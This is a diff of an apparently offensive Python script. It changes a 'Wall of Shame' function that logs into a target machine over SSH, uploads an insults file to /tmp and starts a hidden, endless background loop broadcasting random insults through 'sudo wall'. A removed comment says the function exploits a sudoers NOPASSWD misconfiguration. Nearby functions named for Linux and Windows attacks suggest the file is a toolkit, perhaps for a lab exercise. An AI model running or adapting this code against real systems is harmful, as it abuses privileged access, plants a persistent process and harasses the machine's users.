@@ -88,27 +88,41 @@ def attack_linux_zombie(target_ip):
 
 # --- LINUX ATTACK 3: WALL OF SHAME ---
 def attack_linux_shame(target_ip):
-    print(f"\n[!!!] Deploying 'Wall of Shame' to {target_ip}...")
+    print(f"\n[!!!] Deploying 'Wall of Shame' (Randomized) to {target_ip}...")
     client = None
     try:
+        # 1. Connect
         client = get_linux_client(target_ip)
-        # Exploits Misconfig #15 (Sudoers NOPASSWD).
-        # We inject a bash loop that runs ON THE VICTIM backgrounded.
+        
+        # 2. Upload the insults file via SFTP
+        # We put it in /tmp/ so any user can read/write it
+        print(f"[*] [{target_ip}] Uploading insults.txt to /tmp/...")
+        sftp = client.open_sftp()
+        sftp.put('insults.txt', '/tmp/insults.txt')
+        sftp.close()
+
+        # 3. Execute the Loop
+        # 'shuf -n 1' picks one random line from the file
         loop_command = (
             "nohup bash -c '"
             "while true; do "
-            "echo \"SECURITY ALERT: Guest Account has ROOT access. Fix it!\" | sudo wall; "
+            "shuf -n 1 /tmp/insults.txt | sudo wall; "
             "sleep 45; "
             "done"
             "' > /dev/null 2>&1 &"
         )
+        
         client.exec_command(loop_command)
-        print(f"[+] [{target_ip}] Wall of Shame loop injected.")
+        print(f"[+] [{target_ip}] Wall of Shame loop running (reading from /tmp/insults.txt).")
+
+    except FileNotFoundError:
+        print("[-] Error: 'insults.txt' not found in current directory!")
     except Exception as e:
         print(f"[-] [{target_ip}] Wall of Shame Failed: {e}")
     finally:
         if client: client.close()
-
+        
+        
 # --- WINDOWS ATTACK 1: GOODBYE ---
 def attack_goodbye(target_ip):
     print(f"\n[!!!] Kicking {target_ip} (Goodbye Chat)")
